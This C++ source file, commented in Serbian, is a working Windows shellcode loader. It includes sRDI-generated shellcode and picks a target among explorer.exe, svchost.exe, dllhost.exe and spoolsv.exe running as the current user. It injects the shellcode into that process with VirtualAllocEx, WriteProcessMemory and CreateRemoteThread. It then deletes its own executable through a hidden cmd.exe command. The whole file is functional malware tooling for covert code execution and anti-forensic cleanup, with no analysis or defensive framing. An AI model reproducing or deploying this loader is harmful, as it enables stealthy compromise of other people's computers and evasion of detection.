#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>

// Uključite fajl koji je generisao sRDI alat
#include "shellcode.h"

// Forward declarations
void SelfDelete();
bool IsProcessRunningAsCurrentUser(DWORD processId);
DWORD FindTargetProcess(const std::vector<std::string>& targets);
bool InjectShellcode(DWORD processId, const unsigned char* shellcode, SIZE_T shellcodeSize);

int main() {
    // Definišite ciljne procese
    std::vector<std::string> targets = {"explorer.exe", "svchost.exe", "dllhost.exe", "spoolsv.exe"};

    // Pronađite odgovarajući ciljni proces
    DWORD targetPid = FindTargetProcess(targets);

    if (targetPid != 0) {
        // Ubacite shellcode u pronađeni proces
        if (InjectShellcode(targetPid, shellcode, sizeof(shellcode))) {
            SelfDelete();
            return 0; // Uspeh
        }
    }

    return 1; // Neuspeh
}

/**
 * @brief Ubacuje shellcode u ciljni proces i pokreće ga.
 * @param processId ID ciljnog procesa.
 * @param shellcode Pokazivač na shellcode niz.
 * @param shellcodeSize Veličina shellcode niza.
 * @return True ako je ubacivanje uspelo, inače false.
 */
bool InjectShellcode(DWORD processId, const unsigned char* shellcode, SIZE_T shellcodeSize) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        return false;
    }

    // Alocirajte memoriju u ciljnom procesu
    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteBuffer == NULL) {
        CloseHandle(hProcess);
        return false;
    }

    // Upišite shellcode u alociranu memoriju
    if (!WriteProcessMemory(hProcess, pRemoteBuffer, shellcode, shellcodeSize, NULL)) {
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Pokrenite shellcode u novom thread-u
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
    if (hThread == NULL) {
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Zatvorite handle-ove
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

/**
 * @brief Pronalazi prvi proces sa liste imena koji se izvršava kao trenutni korisnik.
 * @param targets Vektor sa imenima procesa.
 * @return ID procesa ili 0 ako nijedan nije pronađen.
 */
DWORD FindTargetProcess(const std::vector<std::string>& targets) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe32)) {
        do {
            for (const auto& targetName : targets) {
                if (_stricmp(pe32.szExeFile, targetName.c_str()) == 0) {
                    if (IsProcessRunningAsCurrentUser(pe32.th32ProcessID)) {
                        CloseHandle(hSnap);
                        return pe32.th32ProcessID;
                    }
                }
            }
        } while (Process32Next(hSnap, &pe32));
    }

    CloseHandle(hSnap);
    return 0;
}

/**
 * @brief Proverava da li se proces izvršava pod istim korisnikom kao trenutni proces.
 * @param processId ID procesa koji se proverava.
 * @return True ako se proces izvršava kao trenutni korisnik, inače false.
 */
bool IsProcessRunningAsCurrentUser(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (hProcess == NULL) return false;

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        return false;
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return false;
    }

    std::vector<BYTE> tokenUserBuffer(dwSize);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)tokenUserBuffer.data();
    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hCurrentToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hCurrentToken)) {
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return false;
    }

    dwSize = 0;
    GetTokenInformation(hCurrentToken, TokenUser, NULL, 0, &dwSize);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        CloseHandle(hCurrentToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return false;
    }

    std::vector<BYTE> currentUserBuffer(dwSize);
    PTOKEN_USER pCurrentUser = (PTOKEN_USER)currentUserBuffer.data();
    if (!GetTokenInformation(hCurrentToken, TokenUser, pCurrentUser, dwSize, &dwSize)) {
        CloseHandle(hCurrentToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return false;
    }

    bool bIsSameUser = EqualSid(pTokenUser->User.Sid, pCurrentUser->User.Sid);

    CloseHandle(hCurrentToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return bIsSameUser;
}

/**
 * @brief Briše trenutni izvršni fajl tako što pokreće odvojeni cmd.exe proces.
 */
void SelfDelete() {
    char szPath[MAX_PATH];
    if (GetModuleFileNameA(NULL, szPath, MAX_PATH)) {
        char szCmd[MAX_PATH + 100];
        sprintf_s(szCmd, sizeof(szCmd), "cmd.exe /C ping localhost -n 2 > nul && del /f /q \"%s\"", szPath);

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (CreateProcessA(NULL, szCmd, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}
